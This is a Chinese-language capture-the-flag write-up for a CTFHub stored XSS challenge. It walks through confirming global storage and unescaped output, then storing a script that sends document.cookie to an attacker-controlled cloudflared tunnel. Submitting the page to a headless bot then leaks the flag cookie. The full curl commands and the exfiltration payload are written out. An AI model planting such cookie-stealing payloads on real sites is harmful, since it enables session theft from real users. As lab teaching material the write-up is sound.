---
layout: writeup
tags: [ctfhub]

title: "CTFHub CTF Writeup - 存储型"
date: 2026-10-27

skill: "web-xss/存储型"
completed: true
---

# CTFHub Writeup - 存储型

## 题目类型

Web

## 题目描述

XSS Persistent
Change name
CTFHub
Hello,
Send URL to Bot
URL


## 解题过程

<br>1. 先验证存储范围：用 curl -s -X POST -d "name=TESTX1" http://challenge-1b65568dc53a76b0.sandbox.ctfhub.com:10800/ 写入，再用不带 Cookie 的新请求 curl -s http://challenge-1b65568dc53a76b0.sandbox.ctfhub.com:10800/ \| grep Hello 回读，得到 Hello, TESTX1，说明存储是全局的而不是按会话隔离。
<br>2. 存 \<script\> 确认无转义：curl -s -X POST --data-urlencode "name=\<script\>alert(1)\</script\>" http://...，回读得到 \<h1\>Hello, \<script\>alert(1)\</script\>\</h1\>。
<br>3. 起接收端与隧道：python xss\_listener.py 监听 127.0.0.1:8000，cloudflared tunnel --url http://127.0.0.1:8000 得到 https://reviews-dvds-two-newly.trycloudflare.com。
<br>4. 写入外带 payload：curl -s -X POST --data-urlencode "name=\<script\>new Image().src='https://reviews-dvds-two-newly.trycloudflare.com/?c='+encodeURIComponent(document.cookie)\</script\>" http://challenge-1b65568dc53a76b0.sandbox.ctfhub.com:10800/，回读确认 payload 原样落在 \<h1\>Hello, ... 里。
<br>5. 把干净首页提交给 Bot：curl -s -X POST http://.../submit -H "Content-Type: application/json" -d '\{"url":"http://challenge-1b65568dc53a76b0.sandbox.ctfhub.com:10800/"\}'，返回 \{"code":0,"msg":"Successfully"\}。
<br>6. 接收端日志收到 Bot 的 Cookie：22:26:11 GET /?c=flag%3Dctfhub%7B2e689db0d8dabb97293fb29f%7D，UA 为 HeadlessChrome/112；解码得到 flag=ctfhub\{2e689db0d8dabb97293fb29f\}。日志中 22:26:03 的 /selftest 是 Python-urllib 自测请求，用于对比确认第二条来自 Bot。

## 疑问与解答

### 1.

<br>问题：为什么先验证存储是全局的还是按会话的？
<br>解答：存储型 XSS 的利用前提是受害者访问页面时能读到攻击者写入的内容。如果存储按 session 隔离，Bot 使用自己的会话访问首页就看不到写入的 payload；先回读确认全局存储，才能判断后续让 Bot 访问首页的思路是否成立。

### 2.

<br>问题：为什么提交给 Bot 的 URL 里不需要带 payload？
<br>解答：存储型 XSS 的 payload 已经写入服务端存储，并会随正常页面渲染出来。Bot 只要访问干净的首页 URL，页面加载时就会执行已存储的脚本，因此提交 http://challenge-1b65568dc53a76b0.sandbox.ctfhub.com:10800/ 即可。

### 3.

<br>问题：如何确认外带请求来自 Bot 而不是自测？
<br>解答：可以对比接收端日志中的 User-Agent：自测请求显示 Python-urllib/3.14，外带 Cookie 的请求显示 HeadlessChrome/112。HeadlessChrome 更符合 Bot 访问页面的特征，因此可据此区分。


## 本题的核心逻辑：


<br>本题的核心是存储型 XSS：输入写入持久化存储，页面在 \<h1\>Hello, ...\</h1\> 中未转义输出，浏览器把 \<script\> 当作代码执行。

<br>由于 Bot 会访问被提交的 URL，攻击者可以将外带脚本存入页面，再提交正常页面地址；Bot 加载页面时脚本读取 document.cookie，并通过 new Image().src 把 Cookie 编码后发送到接收端，从而在日志中得到 flag。


## 笔记

这道题主要学习了：

<br>1. 存储型 XSS 与反射型不同，payload 不需要出现在交给受害者的 URL 中，而是先写入服务端存储，之后任何访问该页面的浏览器都会触发。
<br>2. 验证阶段先确认数据是否全局存储，再确认输出点未转义；这两点决定后续 Bot 是否能读到并执行 payload。
<br>3. 外带数据时需要一个可被 Bot 访问的接收端，隧道能把本地监听暴露到公网；日志中的 UA 可帮助区分 Bot 与自测请求。
